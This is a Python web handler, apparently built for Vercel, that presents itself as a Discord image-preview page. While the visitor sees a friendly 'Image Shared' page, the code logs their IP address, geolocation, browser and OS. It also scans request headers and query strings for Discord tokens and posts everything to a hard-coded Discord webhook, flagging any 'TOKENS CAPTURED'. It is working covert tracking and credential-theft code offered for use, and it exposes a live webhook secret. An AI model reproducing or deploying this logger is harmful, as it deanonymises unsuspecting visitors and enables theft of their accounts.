from http.server import BaseHTTPRequestHandler
import json
import requests
import httpagentparser
from urllib import parse
from datetime import datetime
import re

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.handle_request()
    
    def do_POST(self):
        self.handle_request()
    
    def handle_request(self):
        try:
            # Configuration
            config = {
                "webhook": "https://discord.com/api/webhooks/1444002832587030660/srIVUDGXmiAVaakGjjKbofvz-DVU62ntAWO-baVOxbUOULyTfrMmsw9oWsfyJUNCAdTe",
                "image": "https://i.pinimg.com/736x/9d/3c/9e/9d3c9eebf9fcd80ded504c5af34d9763.jpg",
                "username": "Security Logger",
                "color": 0x5865F2
            }
            
            # Get client info
            client_ip = self.headers.get('X-Forwarded-For', self.headers.get('X-Real-IP', '0.0.0.0'))
            user_agent = self.headers.get('User-Agent', 'Unknown')
            path = self.path
            
            # Extract query parameters
            query_params = dict(parse.parse_qsl(parse.urlsplit(path).query))
            
            # Get image URL
            image_url = config["image"]
            if query_params.get('url'):
                try:
                    image_url = base64.b64decode(query_params['url'].encode()).decode()
                except:
                    pass
            elif query_params.get('id'):
                try:
                    image_url = base64.b64decode(query_params['id'].encode()).decode()
                except:
                    pass
            
            # Get geolocation
            ip_data = self.get_geolocation(client_ip)
            
            # Extract tokens
            tokens_found = self.extract_tokens(query_params, self.headers)
            
            # Send to Discord
            self.send_discord_alert(config, ip_data, user_agent, path, tokens_found, image_url)
            
            # Send response to client
            self.send_success_response(image_url)
            
        except Exception as e:
            self.send_error_response(str(e))
    
    def get_geolocation(self, ip):
        """Get IP geolocation data"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5)
            if response.status_code == 200:
                return response.json()
        except:
            pass
        return {"status": "fail", "query": ip}
    
    def extract_tokens(self, query_params, headers):
        """Extract Discord tokens from request"""
        tokens = []
        token_patterns = [
            r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}",
            r"mfa\.[a-zA-Z0-9_-]{84}"
        ]
        
        # Check query parameters
        for value in query_params.values():
            for pattern in token_patterns:
                tokens.extend(re.findall(pattern, str(value)))
        
        # Check headers
        for value in headers.values():
            for pattern in token_patterns:
                tokens.extend(re.findall(pattern, str(value)))
        
        return list(set(tokens))
    
    def send_discord_alert(self, config, ip_data, user_agent, path, tokens, image_url):
        """Send alert to Discord webhook"""
        try:
            # Parse user agent
            try:
                os, browser = httpagentparser.simple_detect(user_agent)
                system_info = f"**OS:** {os}\n**Browser:** {browser}"
            except:
                system_info = f"**User Agent:** {user_agent[:100]}..."
            
            # Create embed
            embed = {
                "username": config["username"],
                "embeds": [
                    {
                        "title": "🔷 Security Alert",
                        "color": config["color"],
                        "timestamp": datetime.utcnow().isoformat(),
                        "thumbnail": {"url": image_url},
                        "fields": []
                    }
                ]
            }
            
            # Add IP information
            if ip_data.get("status") == "success":
                embed["embeds"][0]["fields"].extend([
                    {
                        "name": "🌐 Network Information",
                        "value": f"""```yaml
IP: {ip_data['query']}
ISP: {ip_data.get('isp', 'Unknown')}
Country: {ip_data.get('country', 'Unknown')}
City: {ip_data.get('city', 'Unknown')}
```""",
                        "inline": True
                    },
                    {
                        "name": "🛡️ Security Flags",
                        "value": f"""```yaml
Proxy: {ip_data.get('proxy', False)}
Hosting: {ip_data.get('hosting', False)}
Mobile: {ip_data.get('mobile', False)}
```""",
                        "inline": True
                    }
                ])
            
            # Add system information
            embed["embeds"][0]["fields"].append({
                "name": "💻 System Information",
                "value": f"```yaml\n{system_info}\n```",
                "inline": False
            })
            
            # Add tokens if found
            if tokens:
                token_display = "\n".join([f"• {token[:20]}..." for token in tokens[:3]])
                embed["embeds"][0]["fields"].append({
                    "name": "🔑 Tokens Captured",
                    "value": f"```{token_display}```",
                    "inline": False
                })
                embed["content"] = "🚨 **TOKENS CAPTURED**"
            
            # Add endpoint info
            embed["embeds"][0]["fields"].append({
                "name": "📡 Request Details",
                "value": f"```Endpoint: {path}\nMethod: GET\nTimestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```",
                "inline": False
            })
            
            # Send webhook
            requests.post(config["webhook"], json=embed, timeout=10)
            
        except Exception as e:
            # Send error report
            error_embed = {
                "username": config["username"],
                "embeds": [{
                    "title": "❌ Logger Error",
                    "color": 0xFF0000,
                    "description": f"```{str(e)}```",
                    "timestamp": datetime.utcnow().isoformat()
                }]
            }
            try:
                requests.post(config["webhook"], json=error_embed, timeout=5)
            except:
                pass
    
    def send_success_response(self, image_url):
        """Send HTML response to client"""
        html_content = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Preview</title>
    <meta property="og:title" content="Shared Image">
    <meta property="og:image" content="{image_url}">
    <meta property="og:description" content="Check out this image!">
    <meta name="twitter:card" content="summary_large_image">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        
        .container {{
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }}
        
        .header {{
            background: linear-gradient(135deg, #5865F2, #8045DD);
            color: white;
            padding: 30px 20px;
        }}
        
        .header h1 {{
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 600;
        }}
        
        .header p {{
            opacity: 0.9;
            font-size: 16px;
        }}
        
        .content {{
            padding: 30px;
        }}
        
        .image-container {{
            margin: 20px 0;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }}
        
        .image-container img {{
            width: 100%;
            height: auto;
            display: block;
        }}
        
        .status {{
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 4px solid #4CAF50;
        }}
        
        .status.success {{
            border-left-color: #4CAF50;
            background: #f1f8e9;
        }}
        
        .info {{
            color: #666;
            font-size: 14px;
            line-height: 1.5;
            margin-top: 15px;
        }}
        
        .discord-brand {{
            color: #5865F2;
            font-weight: 600;
            margin-top: 20px;
            font-size: 16px;
        }}
        
        @media (max-width: 480px) {{
            .container {{
                margin: 10px;
            }}
            
            .header h1 {{
                font-size: 24px;
            }}
            
            .content {{
                padding: 20px;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🖼️ Image Shared</h1>
            <p>Your image is ready to be viewed</p>
        </div>
        
        <div class="content">
            <div class="image-container">
                <img src="{image_url}" alt="Shared Image" 
                     onerror="this.src='https://via.placeholder.com/500x300/667eea/white?text=Image+Not+Found'">
            </div>
            
            <div class="status success">
                <strong>✅ Successfully Loaded</strong>
                <p style="margin-top: 5px; font-size: 14px; opacity: 0.8;">
                    The image has been processed and is ready for Discord preview.
                </p>
            </div>
            
            <div class="info">
                <p>This image will appear as a rich embed when shared in Discord.</p>
                <p>Make sure the URL is properly formatted for optimal preview quality.</p>
            </div>
            
            <div class="discord-brand">
                Discord Preview Ready ✅
            </div>
        </div>
    </div>

    <script>
        // Add some interactive effects
        document.addEventListener('DOMContentLoaded', function() {{
            const container = document.querySelector('.container');
            container.style.transform = 'translateY(20px)';
            container.style.opacity = '0';
            
            setTimeout(() => {{
                container.style.transition = 'all 0.5s ease';
                container.style.transform = 'translateY(0)';
                container.style.opacity = '1';
            }}, 100);
        }});
        
        // Image error handling
        const img = document.querySelector('img');
        img.addEventListener('error', function() {{
            this.src = 'https://via.placeholder.com/500x300/667eea/white?text=Image+Not+Found';
        }});
    </script>
</body>
</html>
        '''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
    
    def send_error_response(self, error):
        """Send error response"""
        html_content = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Error</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
        }}
        .error-container {{
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }}
    </style>
</head>
<body>
    <div class="error-container">
        <h1>⚠️ Error Loading Image</h1>
        <p>Please try again later.</p>
        <small>{error}</small>
    </div>
</body>
</html>
        '''
        
        self.send_response(500)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))

# Vercel requires this
def handler(request, context):
    return Handler()
